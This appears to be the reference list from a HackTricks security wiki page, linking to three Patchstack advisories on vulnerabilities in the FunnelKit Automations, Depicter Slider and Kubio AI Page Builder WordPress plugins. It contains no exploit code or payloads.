- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
